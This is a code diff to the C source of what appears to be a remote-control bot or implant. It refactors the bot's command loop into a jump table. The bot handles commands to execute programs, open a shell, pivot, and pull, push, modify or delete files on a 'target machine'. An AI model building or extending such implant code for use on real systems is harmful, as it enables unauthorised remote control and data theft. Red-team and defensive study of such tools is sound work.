@@ -20,6 +20,51 @@
 #include "pivot.h"
 #include "uuid4.h"
 
+// Static jump table for the commands.
+//
+// Quick optimization note: I know many of you are grabbing your heads and pulling
+// your metaphorical beards in despair, for this is not the Right Way To Do It.
+// Using a simple switch statement generates much more efficient code, since lookups
+// take at most log(n) comparisons, versus the very linear speed of sequential search.
+// However, this code should be much *smaller* in most of not all architectures - and
+// I'm trying to get the most compact binary possible, not the fastest. So there.
+//
+typedef void (*command_impl)(Parser *p);
+typedef struct {
+    uint16_t cmd_id;
+    command_impl cmd_impl;
+} CommandJumpTable;
+static const CommandJumpTable command_table[] = {
+    {CMD_NOP,           (command_impl) parser_ok},  // keepalive
+    {CMD_SYSTEM_FORK,   do_system_fork},
+#if TICK_FEATURES_DNS
+    {CMD_DNS_RESOLVE,   do_dns_resolve},
+#endif
+#if TICK_FEATURES_EXEC
+    {CMD_FILE_EXEC,     do_file_exec},
+#endif
+#if TICK_FEATURES_FILE
+    {CMD_FILE_PULL,     do_file_pull},
+    {CMD_FILE_PUSH,     do_file_push},
+    {CMD_FILE_UNLINK,   do_file_unlink},
+    {CMD_FILE_CHMOD,    do_file_chmod},
+    {CMD_FILE_OPEN,     do_file_open},
+    {CMD_FILE_READ,     do_file_read},
+    {CMD_FILE_WRITE,    do_file_write},
+    {CMD_FILE_STAT,     do_file_stat},
+    {CMD_FILE_READDIR,  do_file_readdir},
+    {CMD_FILE_READLINK, do_file_readlink},
+    {CMD_FILE_SYMLINK,  do_file_symlink},
+    {CMD_FILE_LINK,     do_file_link},
+    {CMD_FILE_RMDIR,    do_file_rmdir},
+    {CMD_FILE_MKDIR,    do_file_mkdir},
+    {CMD_FILE_CHOWN,    do_file_chown},
+    {CMD_FILE_ACCESS,   do_file_access},
+    {CMD_FILE_STATVFS,  do_file_statvfs},
+#endif
+};
+const unsigned int command_count = sizeof(command_table) / sizeof(typeof(command_table[0]));
+
 #ifndef _WIN32
 
 // Execute the bot as a daemon.
@@ -138,19 +183,18 @@ int run(int argc, char *argv[])
 int command_loop(Parser *p)
 {
     for (;;) {
+        unsigned int index = 0;
+        int found = 0;
 
         // Wait for the next command and read the command block header.
         // This call will block and reconnect if needed.
         parser_wait(p);
 
         // Now depending on the command ID we will do a number of things.
+        // Some commands require special processing, but most are handled
+        // generically by a jump table, defined at the beginning of this module.
         switch (p->header.cmd_id)
         {
-
-        // Just a simple no operation command. Useful for testing.
-        case CMD_NOP:
-            parser_ok(p);
-            break;
 
         // Kill command. Just kill the current process.
         // Global cleanup will be handled by the atexit routine.
@@ -160,11 +204,6 @@ int command_loop(Parser *p)
             parser_close(p);
             return 1;
 
-        // Fork the bot. This will create a new bot instance with a new UUID.
-        case CMD_SYSTEM_FORK:
-            do_system_fork(p);
-            break;
-
 #if TICK_FEATURES_SHELL
 
         // Run an interactive shell.
@@ -173,45 +212,6 @@ int command_loop(Parser *p)
             do_system_shell(p);
             LOG("Channel reused, reconnecting...\n");
             return 0;
-
-#endif
-#if TICK_FEATURES_FILE
-
-        // Grab a file from the target machine.
-        case CMD_FILE_PULL:
-            do_file_pull(p);
-            break;
-
-        // Put a file into the target machine.
-        case CMD_FILE_PUSH:
-            do_file_push(p);
-            break;
-
-        // Delete a file in the target machine.
-        case CMD_FILE_UNLINK:
-            do_file_unlink(p);
-            break;
-
-        // Chmod a file in the target machine.
-        case CMD_FILE_CHMOD:
-            do_file_chmod(p);
-            break;
-
-#endif
-#if TICK_FEATURES_EXEC
-
-        // Run a non-interactive command and return the response.
-        case CMD_FILE_EXEC:
-            do_file_exec(p);
-            break;
-
-#endif
-#if TICK_FEATURES_DNS
-
-        // Domain name resolution.
-        case CMD_DNS_RESOLVE:
-            do_dns_resolve(p);
-            break;
 
 #endif
 #if TICK_FEATURES_PIVOT
@@ -225,8 +225,19 @@ int command_loop(Parser *p)
 
 #endif
 
-        // Unsupported command.
+        // Every other command is processed by the jump table.
         default:
+            found = 0;
+            for (index = 0; index < command_count; index++) {
+                if (command_table[index].cmd_id == p->header.cmd_id) {
+                    command_table[index].cmd_impl(p);
+                    found = 1;
+                    break;
+                }
+            }
+            if (found) break;
+
+            // Unsupported command.
             LOG("Unsupported command: 0x%4x 0x%04x 0x%08x\n", p->header.cmd_id, p->header.cmd_len, p->header.data_len);
             parser_error(p, "not supported");
             break;
@@ -237,7 +248,7 @@ int command_loop(Parser *p)
     }
 }
 
-// Implements the "fork" command.
+// Fork the bot. This will create a new bot instance with a new UUID.
 // Also used internally by other commands.
 void do_system_fork(Parser *p)
 {
@@ -351,7 +362,7 @@ int run_simple_command(const char *command, char *buffer, const size_t count)
 // Implements the "exec" command.
 void do_file_exec(Parser *p)
 {
-    char *command = (char *) &p->buffer;
+    char *command = p->buffer;
     uint16_t buffer_length = 0;
 
     // If the buffer is small, use the stack.
